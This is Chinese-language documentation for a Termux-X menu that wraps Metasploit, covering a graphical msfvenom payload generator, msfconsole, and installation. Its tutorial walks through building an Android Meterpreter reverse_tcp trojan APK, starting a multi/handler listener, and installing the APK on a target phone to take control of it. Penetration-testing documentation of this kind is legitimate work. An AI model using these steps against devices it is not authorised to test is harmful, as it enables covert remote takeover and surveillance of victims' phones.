# Metasploit 框架

Metasploit Framework 是全球最常用的开源渗透测试框架，提供了用于漏洞利用开发、辅助扫描和载荷生成的全套工具。

## 功能入口

在 Termux-X 左侧菜单栏的 **Kali Tools** (或渗透测试) 分类下点击 **Metasploit** 图标。

![msf](/img/kali-tools/10.png)

## 功能说明

点击按钮后会弹出 **Metasploit 控制台与生成器** (`MetasploitDialog`)。此功能深度集成于 **Kali NetHunter Root 环境** (`Kali-Root` 会话) 中。

![msf](/img/kali-tools/11.png)

### 1. Payload 生成器 (msfvenom)

Termux-X 内置了一个图形化的 `msfvenom` 命令生成器，无需记忆复杂的命令行参数即可快速生成木马载荷。

*   **平台类型 (Type)**：支持多种目标平台：
    *   **Android** (生成 `.apk`)
    *   **Windows** (生成 `.exe`)
    *   **Linux** (生成 `.elf`)
    *   **Python** (生成 `.py`)
    *   **PHP** (生成 `.php`)
    *   **Bash** (生成 `.sh`)
*   **连接参数**：
    *   **LHOST**：监听 IP 地址。工具会自动检测并填充当前设备的局域网 IP。
    *   **LPORT**：监听端口（默认为 `4444`）。
    *   **文件名**：生成文件的名称（默认为 `payload`）。
*   **Payload 选项**：
    *   **Payload**：选择 `Meterpreter` (功能强大) 或 `Shell` (基础命令行)。
    *   **Callback**：选择 `Reverse` (反向连接，推荐) 或 `Bind` (正向连接)。
    *   **Stager**：选择 `Staged` (分段传输，体积小) 或 `Stageless` (完整包，更稳定)。
        *   *Staged 示例*：`android/meterpreter/reverse_tcp`
        *   *Stageless 示例*：`android/meterpreter_reverse_tcp`

点击 **生成 Payload** 按钮后，工具会在 Kali 环境中执行 `msfvenom` 命令，生成的木马文件将自动保存到手机的 **/sdcard/Download/** 目录下。

<div style="display: flex; gap: 10px; justify-content: center;">
  <img src="/img/kali-tools/12.png" alt="msf" style="width: 32%;" />
  <img src="/img/kali-tools/13.png" alt="msf" style="width: 32%;" />
  <img src="/img/kali-tools/14.png" alt="msf" style="width: 32%;" />
</div>



### 2. 启动控制台 (msfconsole)

点击 **启动 msfconsole** 按钮，将在 Kali Root 环境中启动 Metasploit 控制台。

<div style="display: flex; gap: 10px; justify-content: center;">
  <img src="/img/kali-tools/15.png" alt="msf" style="width: 32%;" />
  <img src="/img/kali-tools/16.png" alt="msf" style="width: 32%;" />
  <img src="/img/kali-tools/17.png" alt="msf" style="width: 32%;" />
</div>



> **提示**：启动 `msfconsole` 比较消耗资源，且初始化时间较长，请耐心等待。

### 3. 一键安装 (Install)

如果你的 Kali 环境中尚未安装 Metasploit，可以点击 **安装 Metasploit** 按钮。
它会自动执行以下命令：
```bash
apt-get update && apt-get install metasploit-framework -y
```

![msf](/img/kali-tools/18.png)


## 使用教程：生成一个 Android 木马

1.  **准备工作**：确保手机连接到 Wi-Fi，并确认你的 IP 地址（工具会自动填入 LHOST）。
2.  **配置 Payload**：
    *   **Type**: Android
    *   **LHOST**: 你的 IP (例如 192.168.1.5)
    *   **LPORT**: 4444
    *   **Filename**: test_app
3.  **生成**：点击 **生成 Payload**。
    *   观察终端输出，等待生成完成。
    *   生成的文件位于 `/sdcard/Download/test_app.apk`。
4.  **监听**：
    *   点击 **启动 msfconsole**。
    *   在 msf 终端中输入以下命令开启监听：
        ```bash
        use exploit/multi/handler
        set payload android/meterpreter/reverse_tcp
        set LHOST 192.168.1.5
        set LPORT 4444
        run
        ```
5.  **测试**：将生成的 APK 发送到目标手机安装并运行，你将在 Termux-X 中获得目标手机的控制权。

## 注意事项

> [!IMPORTANT]
> **依赖 Kali 容器**：此功能必须在 Kali NetHunter 环境下运行。如果你没有安装 Kali，请先在侧边栏中安装 Kali 容器。
> **Root 权限**：工具会自动尝试获取 Root 权限 (`nethunter -r`) 以确保底层网络功能的正常使用。

> [!WARNING]
> **法律风险**：生成的木马具有攻击性。**严禁**将此工具用于非法用途。请仅在自己拥有的设备或授权的渗透测试环境中使用。
